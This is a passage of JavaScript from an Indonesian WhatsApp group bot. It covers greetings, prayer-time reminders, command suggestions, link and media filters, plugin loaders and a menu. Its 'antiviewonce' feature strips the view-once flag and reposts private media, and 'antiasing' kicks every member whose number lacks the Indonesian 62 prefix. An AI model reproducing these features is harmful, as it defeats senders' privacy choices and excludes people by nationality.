        minutes = Math.floor((duration / (1000 * 60)) % 60),
        hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

      hours = hours < 10 ? "0" + hours : hours;
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;
      return hours + " jam " + minutes + " menit " + seconds + " detik";
    }

    function msToDate(ms) {
      temp = ms;
      days = Math.floor(ms / (24 * 60 * 60 * 1000));
      daysms = ms % (24 * 60 * 60 * 1000);
      hours = Math.floor(daysms / (60 * 60 * 1000));
      hoursms = ms % (60 * 60 * 1000);
      minutes = Math.floor(hoursms / (60 * 1000));
      minutesms = ms % (60 * 1000);
      sec = Math.floor(minutesms / 1000);
      return days + " Hari " + hours + " Jam " + minutes + " Menit";
      // +minutes+":"+sec;
    }

    // Sayying time
    const timee = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (timee < "23:59:00") {
      var waktuucapan = "Selamat Malam 🌃";
    }
    if (timee < "19:00:00") {
      var waktuucapan = "Selamat Petang 🌆";
    }
    if (timee < "18:00:00") {
      var waktuucapan = "Selamat Sore 🌅";
    }
    if (timee < "15:00:00") {
      var waktuucapan = "Selamat Siang 🏙";
    }
    if (timee < "10:00:00") {
      var waktuucapan = "Selamat Pagi 🌄";
    }
    if (timee < "05:00:00") {
      var waktuucapan = "Selamat Subuh 🌉";
    }
    if (timee < "03:00:00") {
      var waktuucapan = "Tengah Malam 🌌";
    }

    Kilianhst.autoshalat = Kilianhst.autoshalat ? Kilianhst.autoshalat : {};
    let who =
      m.mentionedJid && m.mentionedJid[0]
        ? m.mentionedJid[0]
        : m.fromMe
        ? Kilianhst.user.id
        : m.sender;
    let id = m.chat;
    if (id in Kilianhst.autoshalat) {
      return false;
    }
    let jadwalSholat = {
      shubuh: "04:50",
      terbit: "05:44",
      dhuha: "06:02",
      dzuhur: "12:02",
      ashar: "15:15",
      magrib: "18:16",
      isya: "19:27",
    };
    const datek = new Date(
      new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta",
      })
    );
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes
      .toString()
      .padStart(2, "0")}`;
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
      if (timeNow === waktu) {
        let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`;
        Kilianhst.autoshalat[id] = [
          reply(caption),
          setTimeout(async () => {
            delete Kilianhst.autoshalat[m.chat];
          }, 57000),
        ];
      }
    }
    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // DID YOU MEAN
    //=================================================================\\
    if (prefix && command) {
      let caseNames = getCaseNames();
      function getCaseNames() {
        const fs = require("fs");
        try {
          const data = fs.readFileSync("case.js", "utf8");
          const casePattern = /case\s+'([^']+)'/g;
          const matches = data.match(casePattern);
          if (matches) {
            const caseNames = matches.map((match) =>
              match.replace(/case\s+'([^']+)'/, "$1")
            );
            return caseNames;
          } else {
            return [];
          }
        } catch (err) {
          console.log("Terjadi kesalahan:", err);
          return [];
        }
      }
      let Prefix = command;
      let mean = didyoumean(prefix, caseNames);
      let sim = similarity(prefix, mean);
      let similarityPercentage = parseInt(sim * 100);
      if (mean && prefix.toLowerCase() !== mean.toLowerCase()) {
        let response = `Tidak Terdeteksi Fitur!\nApakah Ini Yang Kamu Maksud? \n\nCommand*${
          prefix + mean
        }*\nKemiripan(${similarityPercentage}%)\n`;
        m.reply(response);
      }
    }

    const SESSION_FILE = "./session/ai_sessions.json";

    let sessions = fs.existsSync(SESSION_FILE)
      ? JSON.parse(fs.readFileSync(SESSION_FILE))
      : {};

    function saveSession() {
      fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
    }
    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // FUNCTION ANTI GROUP / JAGA GROUP
    //==================================================================\\
    //antiviewonce
    if (
      db.data.chats[m.chat].antiviewonce &&
      m.isGroup &&
      m.mtype == "viewOnceMessageV2"
    ) {
      let val = { ...m };
      let msg =
        val.message?.viewOnceMessage?.message ||
        val.message?.viewOnceMessageV2?.message;
      delete msg[Object.keys(msg)[0]].viewOnce;
      val.message = msg;
      await Kilianhst.sendMessage(m.chat, { forward: val }, { quoted: m });
    }

    // Anti promotion
    if (db.data.chats[m.chat].antipromotion) {
      if (
        budy.match(
          `Buy|Promo|Sell|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`
        )
      ) {
        if (!isBotAdmins) return;
        if (isCreator) return;
        if (isAdmins) return;
        Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        Kilianhst.sendMessage(
          from,
          {
            text: `\`\`\`「 Promotion Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a promotion message and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }

    // ANTI MEDIA
    if (db.data.chats[m.chat].antimedia && isMedia) {
      if (isCreator || isAdmins || !isBotAdmins) {
      } else {
        reply(
          `\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`
        );
        return Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
      }
    }

    // ANTI IMAGE
    if (db.data.chats[m.chat].image && isXMEDIA) {
      if (isXMEDIA === "imageMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI VIDEO
    if (db.data.chats[m.chat].antivideo && isXMEDIA) {
      if (isXMEDIA === "videoMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTU STICKER
    if (db.data.chats[m.chat].antisticker && isXMEDIA) {
      if (isXMEDIA === "stickerMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI AUDIO
    if (db.data.chats[m.chat].antiaudio && isXMEDIA) {
      if (isXMEDIA === "audioMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI POLLING
    if (db.data.chats[m.chat].antipoll && isXMEDIA) {
      if (isXMEDIA === "pollCreationMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI LOCATION
    if (db.data.chats[m.chat].antilocation && isXMEDIA) {
      if (isXMEDIA === "locationMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI DOCUMENT
    if (db.data.chats[m.chat].antidocument && isXMEDIA) {
      if (isXMEDIA === "documentMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI CONTACT
    if (db.data.chats[m.chat].anticontact && isXMEDIA) {
      if (isXMEDIA === "contactMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          reply(
            `\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`
          );
          return Kilianhst.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }

    // ANTI LINK GC DEL
    if (db.data.chats[m.chat].antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`;
        if (isAdmins) return reply(bvl);
        if (m.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        Kilianhst.sendMessage(
          from,
          {
            text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }

    if (AntiLink)
      if (budy.toLowerCase().includes("chat.whatsapp.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    // Antiwame by Xyroo
    if (AntiWame)
      if (budy.toLowerCase().includes("wa.me")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        kice = m.sender;
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${
              kice.split("@")[0]
            } Jangan kirim wa.me link di group ini`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      } else {
      }
    //antivirtex by Xyroo
    if (AntiVirtex) {
      if (budy.length > 3500) {
        if (!isBotAdmins) return reply(mess.botAdmin);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //antiasing by Xyroo
    if (m.isGroup && isBotAdmins && AntiAsing) {
      let member = await participants.map((x) => x.id);
      for (let i = 0; i < participants.length; i++) {
        if (member[i].slice(0, 2) !== "62") {
          let usersId = await participants.find((u) => u.id == member[i]);
          if (!groupAdmins && !isCreator) {
          } else
            await Kilianhst.groupParticipantsUpdate(
              m.chat,
              [member[i]],
              "remove"
            );
          await sleep(1000);
        }
      }
    }
    //antilink youtube video by Xyroo
    if (AntiLinkYoutubeVid)
      if (budy.toLowerCase().includes("youtu.be")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink youtube channel by Xyroo
    if (AntiLinkYoutubeChannel)
      if (budy.toLowerCase().includes("youtube.com")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink instagram by Xyroo
    if (AntiLinkInstagram)
      if (budy.toLowerCase().includes("instagram.com")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink facebook by Xyroo
    if (AntiLinkFacebook)
      if (budy.toLowerCase().includes("facebook.com")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink telegram by Xyroo
    if (AntiLinkTelegram)
      if (budy.toLowerCase().includes("t.me")) {
        if (AntiLinkTelegram) if (!isBotAdmins) return;
        bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink tiktok by Xyroo
    if (AntiLinkTiktok)
      if (budy.toLowerCase().includes("tiktok.com")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink twitter by Xyroo
    if (AntiLinkTwitter)
      if (budy.toLowerCase().includes("twitter.com")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink all by Xyroo
    if (AntiLinkAll)
      if (budy.toLowerCase().includes("http")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilinkbokep by Xyroo
    if (AntiDewasa)
      if (budy.toLowerCase().includes("doods")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antiterabox by Xyroo
    if (AntiTerabox)
      if (budy.toLowerCase().includes("terabox")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //anti mediafire by Xyroo
    if (AntiMediafire)
      if (budy.toLowerCase().includes("mediafire")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`;
        if (isAdmins) return reply(bvl);
        if (mek.key.fromMe) return reply(bvl);
        if (isCreator) return reply(bvl);
        await Kilianhst.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: mek.key.id,
            participant: mek.key.participant,
          },
        });
        /*Kilianhst.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
        Kilianhst.sendMessage(
          m.chat,
          {
            text: `\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // FUNTION PLUGINS VERSION 1
    //==================================================================\\
    const pluginsLoader = async (directory) => {
      let plugins = [];
      const folders = fs.readdirSync(directory);
      folders.forEach((file) => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
          try {
            const resolvedPath = require.resolve(filePath);
            if (require.cache[resolvedPath]) {
              delete require.cache[resolvedPath];
            }
            const plugin = require(filePath);
            plugins.push(plugin);
          } catch (error) {
            console.log(`Error loading plugin at ${filePath}:`, error);
          }
        }
      });
      return plugins;
    };

    let pluginsDisable = true;
    const plugins = await pluginsLoader(path.resolve(__dirname, "plugins-v1"));
    const Kiliankzy = {
      Kilianhst,
      m,
      prefix,
      isCmd,
      command,
      text,
      sender,
      botNumber,
      senderNumber,
      isCreator,
      pushname,
      isBot,
      quoted,
      mime,
      groupMetadata,
      groupName,
      participants,
      groupAdmins,
      isBotAdmins,
      isAdmins,
      reSize,
      fkethmb,
      smsg,
      fetchJson,
      getBuffer,
      fetchBuffer,
      getGroupAdmins,
      TelegraPh,
      isUrl,
      hitungmundur,
      sleep,
      clockString,
      checkBandwidth,
      runtime,
      tanggal,
      getRandom,
      reply,
      reply2,
      hariini,
      timee,
      waktuucapan,
      example,
    };
    for (let plugin of plugins) {
      if (plugin.command.find((e) => e == command.toLowerCase())) {
        pluginsDisable = false;
        if (typeof plugin !== "function") return;
        await plugin(m, Kiliankzy);
      }
    }
    if (!pluginsDisable) return;

    //==================================================================\\
    // FUNCTIOIN PLUGINS V2
    //==================================================================\\
    const loadPlugins = (directory) => {
      let pluginsx = [];
      const folders = fs.readdirSync(directory);
      folders.forEach((folder) => {
        const folderPath = path.join(directory, folder);
        if (fs.lstatSync(folderPath).isDirectory()) {
          const files = fs.readdirSync(folderPath);
          files.forEach((file) => {
            const filePath = path.join(folderPath, file);
            if (filePath.endsWith(".js")) {
              try {
                delete require.cache[require.resolve(filePath)];
                const pluginx = require(filePath);
                pluginx.filePath = filePath;
                pluginsx.push(pluginx);
              } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
              }
            }
          });
        }
      });
      return pluginsx;
    };
    // Ngambil semua plugin dari direktori plugin
    const pluginsx = loadPlugins(path.resolve(__dirname, "./plugins-v2"));
    const context = {
      Kilianhst,
      m,
      prefix,
      isCmd,
      command,
      text,
      sender,
      botNumber,
      senderNumber,
      isCreator,
      pushname,
      isBot,
      quoted,
      mime,
      groupMetadata,
      groupName,
      participants,
      groupAdmins,
      isBotAdmins,
      isAdmins,
      reSize,
      fkethmb,
      smsg,
      fetchJson,
      getBuffer,
      fetchBuffer,
      getGroupAdmins,
      TelegraPh,
      isUrl,
      hitungmundur,
      sleep,
      clockString,
      checkBandwidth,
      runtime,
      tanggal,
      getRandom,
      reply,
      reply2,
      hariini,
      timee,
      waktuucapan,
      example,
    };
    // Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
    let handled = false;
    for (const pluginx of pluginsx) {
      if (pluginx.command.includes(command)) {
        try {
          await pluginx.operate(context);
          handled = true;
        } catch (error) {
          console.error(`Error executing plugin ${pluginx.filePath}:`, error);
        }
        break;
      }
    }

    //==================================================================\\
    //=================[ TEMPAT CASE DI BAWAH INI ]=================\\
    switch (command) {
      case "menu":
      case "help":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          Kilianhst.sendMessage(from, { react: { text: "😆", key: m.key } });
          let menu = `ʜᴀʟᴏ ᴋᴀᴋ ${pushname} 👏
sᴀʏᴀ ᴀᴅᴀʟᴀʜ *ᴀᴋᴀᴍᴇ ᴀɪ* ᴀsɪsᴛᴇɴᴛ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴜ,, ᴋᴀᴘᴀɴ ᴘᴜɴ ʏᴀ ᴋᴀᴋ 

*ᴀᴋᴀᴍᴇ ᴀɪ* ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ,, ᴅᴀʟᴀᴍ ᴋᴇʙᴜᴛᴜʜᴀɴ sᴏsɪᴀʟ ᴍᴇᴅɪᴀ sᴇᴘᴇʀᴛɪ ᴍᴇɴᴀᴄʀɪ ɪɴғᴏʀᴍᴀsɪ,, ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴀɴɢ ʙᴇʀᴀᴅᴀ ᴅɪ sᴏsᴍᴇᴅ,, ᴀsɪsᴛᴇɴᴛ ᴀɪ ( ᴀᴋᴀᴍᴇ ᴀɪ ) ᴊᴜɢᴀ ʙɪsᴀ ᴍᴇɴᴇᴍᴀɴɪ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ 

> ┌  ◦ ᴄʀᴇᴀᴛᴏʀ : ᴋʏʏxᴅ
> └  ◦ ɴᴀᴍᴇʙᴏᴛ : ᴀᴋᴀᴍᴇ ᴀɪ
`;
          let buttons = [
            {
              buttonId: ".infoHuTao",
              buttonText: { displayText: "ɪɴғᴏʀᴍᴀsɪ" },
            },
          ];

          let buttonMessage = {
            image: {
              url: `https://img12.pixhost.to/images/1260/581261850_rulzz-official.jpg`,
            },
            gifPlayback: true,
            caption: menu,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363405649403674@newsletter",
                newsletterName: `INFO UPDATE`,
              },
            },
            footer: "ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋʏʏxᴅ",
            buttons: buttons,
            viewOnce: true,
            headerType: 6,
          };

          const flowActions = [
            {
              buttonId: "action",
              buttonText: { displayText: "ʟɪsᴛ ᴍᴇɴᴜ" },
              type: 4,
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  title: "sʟʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ",
                  sections: [
                    {
